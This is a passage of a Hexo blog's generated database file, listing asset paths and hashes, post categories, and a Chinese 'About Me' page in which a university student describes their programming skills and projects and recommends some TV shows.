ified":1525413466469},{"_id":"public/archives/2018/page/2/index.html","hash":"ef11e05b9a8b5c9ddc0ff2ee763a777a6eeb50e6","modified":1525413466469},{"_id":"public/archives/2018/01/index.html","hash":"0897af9d80f0858e2533acd8fd733e790e495ee9","modified":1525413466469},{"_id":"public/archives/2018/03/index.html","hash":"b848b38358fa2a5ab379fae25cd0ae2e944b2bcd","modified":1525413466469},{"_id":"public/archives/2018/04/index.html","hash":"f1a0e507be7ea94fd6908c5609c75e70aff39fa0","modified":1525413466469},{"_id":"public/archives/2018/05/index.html","hash":"6ce60fc1b37d01e521b9b173b61b71ecad5b2b80","modified":1525413466469},{"_id":"public/index.html","hash":"38620a3fd819b2d16b1363ef7698b83d5001bcf3","modified":1525413466469},{"_id":"public/page/2/index.html","hash":"1d63cba6ab21f4e6cbfd9aca03182d40cb0d4974","modified":1525413466469},{"_id":"public/page/3/index.html","hash":"6c6a15c9eb507fb54e236da6cc02968041047bf7","modified":1525413466470},{"_id":"public/page/4/index.html","hash":"36e9286875f2bab8fa5e38a5c1d96c6aa0068b55","modified":1525413466470},{"_id":"public/page/5/index.html","hash":"59d87e1ce3c2a546ecc218859a93b20616a20188","modified":1525413466470},{"_id":"public/tags/Android数据传输/index.html","hash":"91482b990485ff8a190e1eeb331f2ec5564d3ef7","modified":1525413466470},{"_id":"public/tags/JVM/index.html","hash":"09d1b77e3805411d017b599a389e6086c94c3468","modified":1525413466470},{"_id":"public/tags/GC/index.html","hash":"1469520da68a5cee2426763ffbedb72469fca016","modified":1525413466470},{"_id":"public/tags/GET/index.html","hash":"f4906208950afa4252ac8d03a4efeebdc6f0abcb","modified":1525413466470},{"_id":"public/tags/POST/index.html","hash":"0c717eb62437e099011b5aa17ffe0f08bd28f532","modified":1525413466470},{"_id":"public/tags/HTTP/index.html","hash":"21c699089ba5efc96620f3af9e32a55a0f5ea1a5","modified":1525413466470},{"_id":"public/tags/Java/index.html","hash":"5e597217e0f73dde64c5fbcb0e902161d71a7f05","modified":1525413466470},{"_id":"public/tags/Object/index.html","hash":"35f40e378da5f4f11c86b3976b826af596b6af8b","modified":1525413466470},{"_id":"public/tags/线程/index.html","hash":"8304276c13edb11307420ecdb444cc32054e9e7a","modified":1525413466470},{"_id":"public/tags/JMM/index.html","hash":"0cba9c4b9fa042f22336c14d23dac07984e174df","modified":1525413466470},{"_id":"public/tags/Happens-Before/index.html","hash":"babe379499a7f48119274bedd6cce9659456ee34","modified":1525413466470},{"_id":"public/tags/Thread/index.html","hash":"199c2a0bfc73e98ae916fc650bc0b45b1970c956","modified":1525413466470},{"_id":"public/tags/线程池/index.html","hash":"d9f5e18f78380355ac84776d5c42ac8425415501","modified":1525413466470},{"_id":"public/tags/static/index.html","hash":"1c5d9803cb5040059af54234d87e74d3048e0eb8","modified":1525413466470},{"_id":"public/tags/final/index.html","hash":"44bffa2f71d422598bbaa025d0330a45c75391ba","modified":1525413466470},{"_id":"public/tags/synchronized/index.html","hash":"f976936495b817f8104928aa1588db5e93318a9d","modified":1525413466470},{"_id":"public/tags/hashCode/index.html","hash":"d0d99f235144b87d8a57ac2d4f0d13eda61c5636","modified":1525413466470},{"_id":"public/tags/equals/index.html","hash":"b5e110ab656608b466b4e91bcf403d5fc78a50e5","modified":1525413466470},{"_id":"public/tags/Collection/index.html","hash":"efabc9c83aec7f01ad9d034c6317f31f5a40812b","modified":1525413466470},{"_id":"public/tags/Kafka/index.html","hash":"38f6c89c0749aa4d4bde23dda1f4fffc64861fa9","modified":1525413466470},{"_id":"public/tags/持久化/index.html","hash":"09dac91cbbe9c5796668196fdf1c7d268ffb60fa","modified":1525413466470},{"_id":"public/tags/备份/index.html","hash":"086c4ac3ae9155c2429d0405d0bffe7b79400091","modified":1525413466470},{"_id":"public/tags/日志压缩/index.html","hash":"df1b8a773b9aa9d7d7798e75cedb6f18006190e1","modified":1525413466471},{"_id":"public/tags/redis持久化/index.html","hash":"ec20037c41018ac2fef49a3af84d8463140b2c2a","modified":1525413466471},{"_id":"public/tags/redis-RDB/index.html","hash":"cfbbf5cd697b8132cddee8fc707ff8271ff3c57b","modified":1525413466471},{"_id":"public/tags/redis-AOF/index.html","hash":"11ce3bc952822aba06fb5ab5182181981c0e39ee","modified":1525413466471},{"_id":"public/tags/Android-Intent/index.html","hash":"1655d94ca3fd393d4da3af37443d76cceb9d8633","modified":1525413466471},{"_id":"public/tags/Android/index.html","hash":"1bbb883335f2362944dc1442d807ee2f43028074","modified":1525413466471},{"_id":"public/tags/ProgressBar/index.html","hash":"8f291f8a77f409d161931973ddf80f345c214087","modified":1525413466471},{"_id":"public/tags/Zookeeper/index.html","hash":"6e194c438c1e9eedb94a57c335b5d00ff0bb4b08","modified":1525413466471},{"_id":"public/tags/FastLeaderElection/index.html","hash":"8539eabb0b9ae2a585ccb487240daa6a9b77c08c","modified":1525413466473},{"_id":"public/tags/hexo搭建/index.html","hash":"91ce81528950552a6c5f479b01b52f5e587a0911","modified":1525413466473},{"_id":"public/tags/Android生命周期/index.html","hash":"78cd9aa0a5c318f8228a0aebc61b06c002076f52","modified":1525413466473},{"_id":"public/tags/Android-Handler/index.html","hash":"87e51fe26937622d67d61010a5732ff89ff90e69","modified":1525413466473},{"_id":"public/tags/centos/index.html","hash":"f14611957844b34b1330836b8533aad3d4bfe3af","modified":1525413466473},{"_id":"public/tags/firewall/index.html","hash":"819bf34d4c4c1d2ecb30b31608d5a9162a104a47","modified":1525413466473},{"_id":"public/tags/lnmp/index.html","hash":"fe2f606eb2b1bdb4614651baa28f138a4e9a6e9d","modified":1525413466473},{"_id":"public/tags/python/index.html","hash":"64095542877ef9fd244dc89b0e48a53ebee31080","modified":1525413466473},{"_id":"public/tags/laravel/index.html","hash":"4c6e3688fe22af1ec2b3dfd7731eefdd5b6847df","modified":1525413466473},{"_id":"public/tags/Docker/index.html","hash":"563d70ec84c9dbb5bae282dc99faef9c8cdc92e4","modified":1525413466473},{"_id":"public/tags/disqus/index.html","hash":"f8075180cc5dc16ee28e4f28f98ac75352f611f8","modified":1525413466473},{"_id":"public/tags/duoshuo/index.html","hash":"42009d443ba659fb217c38697a34671ad2de4ef7","modified":1525413466474},{"_id":"public/tags/git/index.html","hash":"62581b5104ecde348a828e005435227dcf3992c9","modified":1525413466474},{"_id":"public/tags/github/index.html","hash":"51b7e61767c9286ccf0ddc3a613785a8c7fcf8de","modified":1525413466474},{"_id":"public/tags/hexo/index.html","hash":"a64195735b02950859c231309b052f2aa158363b","modified":1525413466474},{"_id":"public/tags/hadoop/index.html","hash":"c9eb3177414ddb3fda0cc9b8ba72edc609f38119","modified":1525413466474},{"_id":"public/tags/Hbase/index.html","hash":"3318e5aa7df5254f653987106431d9c6c7ef8ffe","modified":1525413466474},{"_id":"public/tags/logrotate/index.html","hash":"9476b08b0cdffd6ef4d4144b96d99d1b9fa8924a","modified":1525413466474},{"_id":"public/tags/nmap/index.html","hash":"f85ff4f6207cc485b1062d8943a97cf03a2dd45b","modified":1525413466474},{"_id":"public/tags/storm/index.html","hash":"5b8c15cc4791dc5c970f92f9239ea36e8d5dc78d","modified":1525413466474},{"_id":"public/tags/zookeeper/index.html","hash":"02f9a8fd58bc91c5808c17e04796452b5009f1dd","modified":1525413466474},{"_id":"public/tags/vim/index.html","hash":"c43b5357540eade99d7d1395549b7b1ae1e6dbe2","modified":1525413466474},{"_id":"public/tags/ubuntu/index.html","hash":"61495c1987964fae96a46ff0be3ed4f16b0be1a8","modified":1525413466474},{"_id":"public/tags/unix时间/index.html","hash":"31cd325511545716ebb6f0c79243d69acd808d26","modified":1525413466475},{"_id":"public/tags/zabbix/index.html","hash":"0f2e4ba897653956781477c946cc380d0861d7f7","modified":1525413466475},{"_id":"public/tags/apache/index.html","hash":"e04940fe1e84a3a662def7ceb036bac7d2c6ec39","modified":1525413466475},{"_id":"public/tags/nginx/index.html","hash":"6ca63c68054e97713233b119097902a921d01eec","modified":1525413466475},{"_id":"public/tags/Shadowsocks/index.html","hash":"6156bdd20a4d3ed3537a1341cf40971bc465c79f","modified":1525413466475},{"_id":"public/tags/代码注入/index.html","hash":"7a1833295e8d0260812842e59c2075a388041234","modified":1525413466475},{"_id":"public/tags/spark/index.html","hash":"1121ff4255dce107a6dbbabd9f6536f0444051e5","modified":1525413466475},{"_id":"public/tags/C/index.html","hash":"5fec84db4aaf38c1491e517b1460dae21e6ef169","modified":1525413466475},{"_id":"public/tags/SQL/index.html","hash":"b131e3147c5291ddb8fbf8f9186fa8999485661c","modified":1525413466475},{"_id":"public/tags/索引/index.html","hash":"b719f448581cf5a63b5b62ee4964cbde51010e54","modified":1525413466475},{"_id":"public/tags/数据结构/index.html","hash":"f32fc4bcdf3bb148b43bb70bbb374428bdbbe12d","modified":1525413466475},{"_id":"public/tags/mysql/index.html","hash":"cdfaf16a33df72e63ffc354d605595cf844f40aa","modified":1525413466475},{"_id":"public/tags/爬虫/index.html","hash":"1e9b1e10fcc0ca9dbf943a0d14bdbf4d3ebe6f94","modified":1525413466475},{"_id":"public/tags/桥接/index.html","hash":"d2b37615e9e2ef8629135ccded19bfeb083cf843","modified":1525413466475},{"_id":"public/tags/抽象/index.html","hash":"48b8c122a42260925650a6258917a1bc7554cc00","modified":1525413466475},{"_id":"public/images/1.png","hash":"dca5bc746bbc0f9f5c89da4bf0ef868c3a59f416","modified":1525413466491},{"_id":"public/images/WebServer.png","hash":"be7cb62dd299115053575a160d3ad65afacff1f3","modified":1525413466491},{"_id":"public/images/attacks.png","hash":"c9bf158ce7fb77a0a74eba0ba3016932c19c0b80","modified":1525413466491},{"_id":"public/images/bridge.png","hash":"3de3895de5e6cdd930e1bd1d7b2179f1a0536dea","modified":1525413466491},{"_id":"public/images/attacks2.png","hash":"20be98e331d8b83993f7fbf847f613bb08e3eb1f","modified":1525413466491},{"_id":"public/images/cpu.png","hash":"d42cfb3eea8a7f67308bf4d4d7b42c2247b38dae","modified":1525413466491},{"_id":"public/images/hadoop-master-slaves-conf.png","hash":"efba2aa220350a83c72cb507f58f0c16d74f773f","modified":1525413466491},{"_id":"public/images/laravel_problem_1.png","hash":"f1df9d6baac037ff27d6e4d9350c59f6e5d4f25c","modified":1525413466491},{"_id":"public/images/nginxUser.png","hash":"64c463913624cf737ea99555e2f4c7adcd72354b","modified":1525413466491},{"_id":"public/images/nginxlog.png","hash":"47d9f2e2ffd857b390071a872cdd3dc904936a39","modified":1525413466491},{"_id":"public/images/r_heap1.PNG","hash":"ef5b550960fedfaad57ad38685e89b6b1306c182","modified":1525413466491},{"_id":"public/images/sql1.png","hash":"6026bbc425a009f7c5c5bbb35e47b660ee78f5d7","modified":1525413466491},{"_id":"public/images/sql2.png","hash":"6394f27497ab8867a3455f6c2c5fcc7dc846b82b","modified":1525413466491},{"_id":"public/images/sql3.png","hash":"5b0d30b128040caa61885525150f4552b5a843ff","modified":1525413466491},{"_id":"public/images/sql5.png","hash":"9ab1c2fc7bbc8942144f51eeb180165e4b264eea","modified":1525413466492},{"_id":"public/images/sql4.png","hash":"ccbb51fe11e8144556a8d07a726949513ed00b70","modified":1525413466492},{"_id":"public/images/sql7.png","hash":"187152529aaae210323f656dd7db47f5ee499716","modified":1525413466492},{"_id":"public/images/sql6.png","hash":"b5b985e14be3c513c51a40e4b468bc8e9d18716a","modified":1525413466492},{"_id":"public/images/algolia_logo.svg","hash":"90035272fa31a3f65b3c0e2cb8a633876ef457dc","modified":1525413466492},{"_id":"public/images/avatar.gif","hash":"264082bb3a1af70d5499c7d22b0902cb454b6d12","modified":1525413466492},{"_id":"public/images/cc-by-nc-nd.svg","hash":"c6524ece3f8039a5f612feaf865d21ec8a794564","modified":1525413466492},{"_id":"public/images/cc-by-nc-sa.svg","hash":"3031be41e8753c70508aa88e84ed8f4f653f157e","modified":1525413466492},{"_id":"public/images/cc-by-nc.svg","hash":"8d39b39d88f8501c0d27f8df9aae47136ebc59b7","modified":1525413466492},{"_id":"public/images/cc-by-nd.svg","hash":"c563508ce9ced1e66948024ba1153400ac0e0621","modified":1525413466492},{"_id":"public/images/cc-by-sa.svg","hash":"aa4742d733c8af8d38d4c183b8adbdcab045872e","modified":1525413466492},{"_id":"public/images/cc-by.svg","hash":"28a0a4fe355a974a5e42f68031652b76798d4f7e","modified":1525413466492},{"_id":"public/images/cc-zero.svg","hash":"87669bf8ac268a91d027a0a4802c92a1473e9030","modified":1525413466492},{"_id":"public/images/loading.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525413466492},{"_id":"public/images/placeholder.gif","hash":"5fbd472222feb8a22cf5b8aa5dc5b8e13af88e2b","modified":1525413466492},{"_id":"public/images/quote-l.svg","hash":"94e870b4c8c48da61d09522196d4dd40e277a98f","modified":1525413466492},{"_id":"public/images/quote-r.svg","hash":"e60ae504f9d99b712c793c3740c6b100d057d4ec","modified":1525413466492},{"_id":"public/images/searchicon.png","hash":"67727a6a969be0b2659b908518fa6706eed307b8","modified":1525413466492},{"_id":"public/lib/fastclick/LICENSE","hash":"dcd5b6b43095d9e90353a28b09cb269de8d4838e","modified":1525413466492},{"_id":"public/lib/font-awesome/HELP-US-OUT.txt","hash":"4f7bf961f1bed448f6ba99aeb9219fabf930ba96","modified":1525413466492},{"_id":"public/lib/fancybox/source/blank.gif","hash":"2daeaa8b5f19f0bc209d976c02bd6acb51b00b0a","modified":1525413466492},{"_id":"public/lib/fancybox/source/fancybox_loading.gif","hash":"1a755fb2599f3a313cc6cfdb14df043f8c14a99c","modified":1525413466492},{"_id":"public/lib/fancybox/source/fancybox_loading@2x.gif","hash":"273b123496a42ba45c3416adb027cd99745058b0","modified":1525413466492},{"_id":"public/lib/fancybox/source/fancybox_overlay.png","hash":"b3a4ee645ba494f52840ef8412015ba0f465dbe0","modified":1525413466492},{"_id":"public/lib/fancybox/source/fancybox_sprite.png","hash":"17df19f97628e77be09c352bf27425faea248251","modified":1525413466492},{"_id":"public/lib/fancybox/source/fancybox_sprite@2x.png","hash":"30c58913f327e28f466a00f4c1ac8001b560aed8","modified":1525413466492},{"_id":"public/lib/font-awesome/css/font-awesome.css.map","hash":"0189d278706509412bac4745f96c83984e1d59f4","modified":1525413466492},{"_id":"public/lib/Han/dist/font/han-space.otf","hash":"07436f011b44051f61b8329c99de4bec64e86f4b","modified":1525413466492},{"_id":"public/lib/Han/dist/font/han-space.woff","hash":"7a635062b10bf5662ae1d218ba0980171005d060","modified":1525413466492},{"_id":"public/lib/Han/dist/font/han.otf","hash":"f1f6bb8f461f5672e000380195d3d2358a28494c","modified":1525413466492},{"_id":"public/lib/Han/dist/font/han.woff","hash":"f38ff9b2eecaa17b50b66aa2dae87e9e7436d195","modified":1525413466492},{"_id":"public/lib/fancybox/source/helpers/fancybox_buttons.png","hash":"e385b139516c6813dcd64b8fc431c364ceafe5f3","modified":1525413466493},{"_id":"public/images/2.png","hash":"82d30a1f2bcfbe440dfe4c598f7c127805a05ad9","modified":1525413467130},{"_id":"public/images/crontab.png","hash":"04c210d4722ca85a1b4b4d6f75fa28beea2cbde4","modified":1525413467130},{"_id":"public/images/mr_robot.png","hash":"9e6dc137852083d647d8e334a21bfb1626745ef5","modified":1525413467143},{"_id":"public/images/nmap_mac2.jpg","hash":"f9299c25aa8244747ad1a1ca413e2601e90866a4","modified":1525413467143},{"_id":"public/images/stitchers.png","hash":"f7500b397fac4c248f3482af187f9b88f50e4346","modified":1525413467143},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff","hash":"28b782240b3e76db824e12c02754a9731a167527","modified":1525413467143},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1525413467143},{"_id":"public/js/src/algolia-search.js","hash":"b172f697ed339a24b1e80261075232978d164c35","modified":1525413467148},{"_id":"public/js/src/affix.js","hash":"978e0422b5bf1b560236d8d10ebc1adcf66392e3","modified":1525413467148},{"_id":"public/js/src/bootstrap.js","hash":"aab7be0a6e2724b3faa9338db93c19556c559625","modified":1525413467148},{"_id":"public/js/src/exturl.js","hash":"e42e2aaab7bf4c19a0c8e779140e079c6aa5c0b1","modified":1525413467148},{"_id":"public/js/src/hook-duoshuo.js","hash":"a6119070c0119f33e08b29da7d2cce2635eb40a0","modified":1525413467148},{"_id":"public/js/src/js.cookie.js","hash":"9b37973a90fd50e71ea91682265715e45ae82c75","modified":1525413467148},{"_id":"public/js/src/post-details.js","hash":"af7a417dd1cb02465a7b98211653e7c6192e6d55","modified":1525413467148},{"_id":"public/js/src/motion.js","hash":"269414e84df544a4ccb88519f6abae4943db3c67","modified":1525413467148},{"_id":"public/js/src/scroll-cookie.js","hash":"09dc828cbf5f31158ff6250d2bf7c3cde6365c67","modified":1525413467148},{"_id":"public/js/src/scrollspy.js","hash":"fe4da1b9fe73518226446f5f27d2831e4426fc35","modified":1525413467148},{"_id":"public/js/src/utils.js","hash":"b2ea56de27fddc6d9118051da384f781cd93951d","modified":1525413467148},{"_id":"public/lib/canvas-nest/canvas-nest.min.js","hash":"0387e75e23b1db108a755073fe52a0d03eb391a7","modified":1525413467148},{"_id":"public/lib/canvas-ribbon/canvas-ribbon.js","hash":"3587602ad777b031628bb5944864d1a4fcfea4ac","modified":1525413467148},{"_id":"public/lib/fastclick/bower.json","hash":"4dcecf83afddba148464d5339c93f6d0aa9f42e9","modified":1525413467148},{"_id":"public/lib/fastclick/README.html","hash":"da3c74d484c73cc7df565e8abbfa4d6a5a18d4da","modified":1525413467148},{"_id":"public/lib/font-awesome/bower.json","hash":"64394a2a9aa00f8e321d8daa5e51a420f0e96dad","modified":1525413467148},{"_id":"public/lib/algolia-instant-search/instantsearch.min.css","hash":"90ef19edc982645b118b095615838d9c5eaba0de","modified":1525413467148},{"_id":"public/lib/jquery_lazyload/README.html","hash":"bde24335f6bc09d8801c0dcd7274f71b466552bd","modified":1525413467148},{"_id":"public/lib/jquery_lazyload/CONTRIBUTING.html","hash":"a6358170d346af13b1452ac157b60505bec7015c","modified":1525413467148},{"_id":"public/lib/jquery_lazyload/bower.json","hash":"ae3c3b61e6e7f9e1d7e3585ad854380ecc04cf53","modified":1525413467149},{"_id":"public/lib/jquery_lazyload/jquery.lazyload.js","hash":"481fd478650e12b67c201a0ea41e92743f8b45a3","modified":1525413467149},{"_id":"public/lib/jquery_lazyload/jquery.scrollstop.js","hash":"0e9a81785a011c98be5ea821a8ed7d411818cfd1","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-barber-shop.min.css","hash":"ee0d51446cb4ffe1bb96bd7bc8c8e046dddfcf46","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-big-counter.min.css","hash":"5b561dc328af4c4d512e20a76fe964d113a32ba8","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-bounce.min.css","hash":"f6bdb9a785b7979dd8ec5c60e278af955ef1e585","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-center-circle.min.css","hash":"a4066769c78affbfbc5e30a600e2c7862cd532e0","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-center-atom.min.css","hash":"dcf79c24fe5350fb73d8038573a104e73639e9d3","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-center-radar.min.css","hash":"ab7cba998bf4c03b13df342bf43647fa4f419783","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-center-simple.min.css","hash":"67f44c947548bd4d77e7590d3f59e236cbf9e98a","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-corner-indicator.min.css","hash":"b3c64c973f31884e3d8145989476707333406b9a","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-fill-left.min.css","hash":"0bec1e235a4a2cccda3f993b205424e1441a44ae","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-flash.min.css","hash":"13ace22c40312d7bbd8d9c1e50eff897a7a497d8","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-loading-bar.min.css","hash":"7ee28875dfc1230d76c537f6605766e8d4011e9f","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-mac-osx.min.css","hash":"9f2e7b51b084da407863826b25265b31150b3821","modified":1525413467149},{"_id":"public/lib/pace/pace-theme-minimal.min.css","hash":"9cd783cceb8a191f3c8b5d81f7a430ecc3e489d3","modified":1525413467149},{"_id":"public/lib/pace/pace.min.js","hash":"9944dfb7814b911090e96446cea4d36e2b487234","modified":1525413467149},{"_id":"public/lib/velocity/bower.json","hash":"0ef14e7ccdfba5db6eb3f8fc6aa3b47282c36409","modified":1525413467149},{"_id":"public/lib/velocity/velocity.ui.min.js","hash":"ed5e534cd680a25d8d14429af824f38a2c7d9908","modified":1525413467149},{"_id":"public/js/src/schemes/pisces.js","hash":"79da92119bc246fe05d1626ac98426a83ec90a94","modified":1525413467149},{"_id":"public/lib/fancybox/source/jquery.fancybox.css","hash":"5f163444617b6cf267342f06ac166a237bb62df9","modified":1525413467149},{"_id":"public/lib/fastclick/lib/fastclick.min.js","hash":"2cae0f5a6c5d6f3cb993015e6863f9483fc4de18","modified":1525413467150},{"_id":"public/lib/ua-parser-js/dist/ua-parser.min.js","hash":"38628e75e4412cc6f11074e03e1c6d257aae495b","modified":1525413467150},{"_id":"public/lib/ua-parser-js/dist/ua-parser.pack.js","hash":"214dad442a92d36af77ed0ca1d9092b16687f02f","modified":1525413467150},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-buttons.css","hash":"1a9d8e5c22b371fcc69d4dbbb823d9c39f04c0c8","modified":1525413467150},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-buttons.js","hash":"91e41741c2e93f732c82aaacec4cfc6e3f3ec876","modified":1525413467150},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-media.js","hash":"3bdf69ed2469e4fb57f5a95f17300eef891ff90d","modified":1525413467150},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-thumbs.css","hash":"4ac329c16a5277592fc12a37cca3d72ca4ec292f","modified":1525413467150},{"_id":"public/lib/fancybox/source/helpers/jquery.fancybox-thumbs.js","hash":"53e194f4a72e649c04fb586dd57762b8c022800b","modified":1525413467150},{"_id":"public/css/main.css","hash":"78831e287d9d5582826d2d663258ce7201ec49d1","modified":1525413467150},{"_id":"public/lib/three/canvas_sphere.min.js","hash":"d8ea241a53c135a650f7335d2b6982b899fd58a9","modified":1525413467150},{"_id":"public/lib/three/canvas_lines.min.js","hash":"dce4a3b65f8bf958f973690caa7ec4952f353b0c","modified":1525413467150},{"_id":"public/lib/three/three-waves.min.js","hash":"d968cba6b3a50b3626a02d67b544f349d83b147c","modified":1525413467150},{"_id":"public/lib/velocity/velocity.min.js","hash":"2f1afadc12e4cf59ef3b405308d21baa97e739c6","modified":1525413467150},{"_id":"public/lib/velocity/velocity.ui.js","hash":"6a1d101eab3de87527bb54fcc8c7b36b79d8f0df","modified":1525413467150},{"_id":"public/lib/Han/dist/han.min.css","hash":"d9c0b3dc9158e717fde36f554709e6c3a22b5f85","modified":1525413467150},{"_id":"public/lib/jquery/index.js","hash":"41b4bfbaa96be6d1440db6e78004ade1c134e276","modified":1525413467150},{"_id":"public/lib/Han/dist/han.min.js","hash":"f559c68a25065a14f47da954a7617d87263e409d","modified":1525413467150},{"_id":"public/lib/fancybox/source/jquery.fancybox.js","hash":"1cf3d47b5ccb7cb6e9019c64f2a88d03a64853e4","modified":1525413467150},{"_id":"public/lib/fancybox/source/jquery.fancybox.pack.js","hash":"53360764b429c212f424399384417ccc233bb3be","modified":1525413467151},{"_id":"public/lib/fastclick/lib/fastclick.js","hash":"06cef196733a710e77ad7e386ced6963f092dc55","modified":1525413467151},{"_id":"public/lib/font-awesome/css/font-awesome.css","hash":"0140952c64e3f2b74ef64e050f2fe86eab6624c8","modified":1525413467151},{"_id":"public/lib/font-awesome/css/font-awesome.min.css","hash":"512c7d79033e3028a9be61b540cf1a6870c896f8","modified":1525413467151},{"_id":"public/lib/Han/dist/han.css","hash":"38e48f275ad00daa9dcdcb8d9b44e576acda4707","modified":1525413467151},{"_id":"public/lib/Han/dist/han.js","hash":"e345397e0585c9fed1449e614ec13e0224acf2ab","modified":1525413467151},{"_id":"public/lib/velocity/velocity.js","hash":"9f08181baea0cc0e906703b7e5df9111b9ef3373","modified":1525413467151},{"_id":"public/lib/algolia-instant-search/instantsearch.min.js","hash":"9ccc6f8144f54e86df9a3fd33a18368d81cf3a4f","modified":1525413467151},{"_id":"public/lib/three/three.min.js","hash":"73f4cdc17e51a72b9bf5b9291f65386d615c483b","modified":1525413467151},{"_id":"public/images/docker1.png","hash":"d86e4f6c50e6abc4b8e8d2b832cdc2700f30c39c","modified":1525413467151},{"_id":"public/images/laravel_problem.png","hash":"cd93cfa692bab4c6c4ef7da0df0afe8933d30adf","modified":1525413467151},{"_id":"public/lib/font-awesome/fonts/FontAwesome.otf","hash":"048707bc52ac4b6563aaa383bfe8660a0ddc908c","modified":1525413467151},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.eot","hash":"d980c2ce873dc43af460d4d572d441304499f400","modified":1525413467151},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.ttf","hash":"13b1eab65a983c7a73bc7997c479d66943f7c6cb","modified":1525413467151},{"_id":"public/images/cobra.png","hash":"e161995f5a59fa43667781aad8622de404efbd47","modified":1525413467156},{"_id":"public/images/hadoopdownloads.png","hash":"7dc4b74d9b18a9e197f0c513ff0851a1a91fb171","modified":1525413467156},{"_id":"public/images/the_matrix.png","hash":"2fb2e5a83952d600437d321be8de4d0f7dbcb872","modified":1525413467156},{"_id":"public/images/nmap_mac1.jpg","hash":"b52286896512801c321323bff7bf2b56c5d7f8f5","modified":1525413467159},{"_id":"public/lib/font-awesome/fonts/fontawesome-webfont.svg","hash":"98a8aa5cf7d62c2eff5f07ede8d844b874ef06ed","modified":1525413467160}],"Category":[{"name":"Android","_id":"cjgrjscwq0005yp0lpielq88q"},{"name":"Java","_id":"cjgrjscx7000cyp0lcsivvlbc"},{"name":"Web","_id":"cjgrjscxg000jyp0l7cxtyskg"},{"name":"分布式计算","_id":"cjgrjscxz0011yp0lg40wf24e"},{"name":"数据库","_id":"cjgrjscy60018yp0lrfse591q"},{"name":"hexo","_id":"cjgrjscyd001hyp0lng5mxojk"},{"name":"linux","_id":"cjgrjscyn001oyp0la3lbgv9c"},{"name":"git","_id":"cjgrjscz30021yp0lbxbcnvwf"},{"name":"php","_id":"cjgrjsczn002myp0lm51rq8x1"},{"name":"流式计算","_id":"cjgrjsczt002wyp0l5hoy2ztu"},{"name":"Web服务器","_id":"cjgrjsd08003dyp0lc63ewl47"},{"name":"安全","_id":"cjgrjsd0e003myp0lemp2bfa0"},{"name":"数据结构","_id":"cjgrjsd0l003vyp0l5rwa31jo"},{"name":"python","_id":"cjgrjsd0t0043yp0lt0r3edj0"},{"name":"设计模式","_id":"cjgrjsd0t0047yp0l027ejjdg"}],"Data":[],"Page":[{"title":"About Me","date":"2017-11-28T05:06:34.000Z","_content":"\n## 一点点音讯\n\n本人大三流浪一枚，游走在一些有趣却又觉得用处不大的东西之间，个人意向`分布式计算`和`Java后台`。写过`java`、`c++`、`php`，干过`Android`开发，做过`laravel` `spring boot`项目。对`linux`情有独钟，但好像也没有特别清楚的方向去深究，自学能力较好，想做全栈还是个菜鸟。学习了一段时间`kafka`、`storm`，对`spark`有一定了解，了解`Redis`持久化。\n\n异于喜欢二次元的宅男，本人只追国漫秦时七八载，贴上痴迷的大叔二叔\n![](http://m13.mask9.com/sites/default/files/styles/l/public/imagepad/20130929/20130929035607-3c3730f510e613e4b06b3b6c6f83fd3f831b9ee1.28/animation-qinshimingyue-mask9.jpg)\n\n生活挑剔多变，性格沉闷，话少却爱吹牛，稍带一点强迫症症状。游戏玩得偏少，已剧慌好久，但极爱看美帝科幻。\n\n\n## 个人项目\n| 项目 | 简介 | 地址 |\n|--------|--------|\n|   ChatTool     |   利用极光推送编写的类似QQ的简易聊天软件     |   https://github.com/fenlan/ChatTool　|\n|   BookShop     |   利用laravel框架编写的网上书店     |   http://fenlan96.com/ |\n|   云计算课程项目     |   利用kafka、redis、hbase、spark构建的一套消息接收、处理、呈现系统     |   https://github.com/fenlan?tab=repositories |\n|   nginx实时日志统计 |  利用Storm框架进行实时计算的nginx日志统计系统　|  https://github.com/fenlan/storm-nginx-log |\n\n## 推荐几部剧\n![Mr. Robot](/images/mr_robot.png)\n<p align=\"center\">Mr. Robot</p>\n![Stitchers](/images/stitchers.png)\n<p align=\"center\">Stitchers</p>\n![The Matrix](/images/the_matrix.png)\n<p align=\"center\">The Matrix</p>\n![G.I. Joe: The Rise of Cobra](/images/cobra.png)\n<p align=\"center\">G.I. Joe: The Rise of Cobra</p>","source":"about/index.md","raw":"---\ntitle: About Me\ndate: 2017-11-28 13:06:34\n---\n\n## 一点点音讯\n\n本人大三流浪一枚，游走在一些有趣却又觉得用处不大的东西之间，个人意向`分布式计算`和`Java后台`。写过`java`、`c++`、`php`，干过`Android`开发，做过`laravel` `spring boot`项目。对`linux`情有独钟，但好像也没有特别清楚的方向去深究，自学能力较好，想做全栈还是个菜鸟。学习了一段时间`kafka`、`storm`，对`spark`有一定了解，了解`Redis`持久化。\n\n异于喜欢二次元的宅男，本人只追国漫秦时七八载，贴上痴迷的大叔二叔\n![](http://m13.mask9.com/sites/default/files/styles/l/public/imagepad/20130929/20130929035607-3c3730f510e613e4b06b3b6c6f83fd3f831b9ee1.28/animation-qinshimingyue-mask9.jpg)\n\n生活挑剔多变，性格沉闷，话少却爱吹牛，稍带一点强迫症症状。游戏玩得偏少，已剧慌好久，但极爱看美帝科幻。\n\n\n## 个人项目\n| 项目 | 简介 | 地址 |\n|--------|--------|\n|   ChatTool     |   利用极光推送编写的类似QQ的简易聊天软件     |   